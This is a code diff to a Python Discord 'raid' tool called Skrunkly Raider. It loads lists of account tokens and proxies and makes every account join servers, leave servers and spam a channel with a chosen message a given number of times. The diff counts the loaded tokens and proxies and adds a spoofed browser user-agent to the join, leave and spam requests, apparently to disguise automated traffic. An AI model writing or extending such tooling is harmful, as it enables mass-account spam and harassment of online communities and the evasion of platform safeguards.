@@ -10,9 +10,22 @@ with open("config.json", encoding='utf-8', errors='ignore') as f:
     configdata = json.load(f, strict=False)
 config = configdata["BotConfig"]
 
+def _count_generator(reader):
+    b = reader(1024 * 1024)
+    while b:
+        yield b
+        b = reader(1024 * 1024)
+
 tokens = open('tokens.txt','r').read().splitlines()
 proxies = open('proxies.txt','r').read().splitlines()
 proxies = [{'https':'http://'+proxy} for proxy in proxies]
+with open("tokens.txt", 'rb') as fp:
+    c_generator = _count_generator(fp.raw.read)
+    count = sum(buffer.count(b'\n') for buffer in c_generator)
+
+with open("proxies.txt", 'rb') as bp:
+    c_generator = _count_generator(bp.raw.read)
+    lolz = sum(buffer.count(b'\n') for buffer in c_generator)
 
 class VERSION:
     __version__ = 1.0
@@ -22,6 +35,8 @@ def Setup():
     os.system('cls')
     print(Fore.CYAN + '\n\n     >>' + Fore.RESET + ' Welcome to Skrunkly Raider ' + Fore.CYAN + f'v{VERSION.__version__}', Fore.RESET)
     print(Fore.CYAN + '     >>' + Fore.RESET + ' Github Link ' + Fore.CYAN +  '>>' + Fore.CYAN + f' https://github.com/3jm/Skrunkly', Fore.RESET)
+    print(Fore.CYAN + f'     >> {Fore.GREEN}{count + 1}' + Fore.RESET + ' Tokens Loaded.')
+    print(Fore.CYAN + f'     >> {Fore.GREEN}{lolz + 1}' + Fore.RESET + ' Proxies Loaded.')
     print(Fore.CYAN + '\n\n     1 >>' + Fore.RESET + ' Join (Invite Code)' + Fore.RESET)
     print(Fore.CYAN + '     2 >>'+ Fore.RESET + ' Leave (Server ID)' + Fore.RESET)
     print(Fore.CYAN + '     3 >>' + Fore.RESET + ' Spam (Channel ID) (Amount) (Message)' + Fore.RESET)
@@ -41,7 +56,7 @@ def Join(invite):
                 r = bot.joinGuild(inv)
         else:
             for tok in tokens:
-                r = req.post(f'https://discord.com/api/v9/invites/{inv}', headers = {"Authorization": tok})
+                r = req.post(f'https://discord.com/api/v9/invites/{inv}', headers = {"Authorization": tok, "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"})
         print(f'{Fore.CYAN}     >>{Fore.RESET} All accounts have attempted to join the server.')
     except Exception as e:
         print(f"{Fore.RED}     [ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
@@ -56,7 +71,7 @@ def Leave(serverid):
                 r = req.delete(f'https://discord.com/api/v9/users/@me/guilds/{serverid}', headers = {'Authorization': tok}, proxies = proxy)
         else:
             for tok in tokens:
-                r = req.delete(f'https://discord.com/api/v9/users/@me/guilds/{serverid}', headers = {'Authorization': tok})
+                r = req.delete(f'https://discord.com/api/v9/users/@me/guilds/{serverid}', headers = {'Authorization': tok, "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"})
         print(f'{Fore.CYAN}     >>{Fore.RESET} All accounts have attempted to leave the server.')
     except Exception as e:
         print(f"{Fore.YELLOW}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
@@ -73,7 +88,7 @@ def Spam(channel, amount, message):
         else:
             for _ in range(int(amount)):
                 for tok in tokens:
-                    r = req.post(f'https://discordapp.com/api/v9/channels/{channel}/messages', headers = {'Authorization': tok}, json = {'content': message,'nonce':'','tts':False})
+                    r = req.post(f'https://discordapp.com/api/v9/channels/{channel}/messages', headers = {'Authorization': tok, "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"}, json = {'content': message,'nonce':'','tts':False})
                 print(f'{Fore.CYAN}     >>{Fore.RESET} Spammed!')
     except Exception as e:
         print(f"{Fore.YELLOW}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
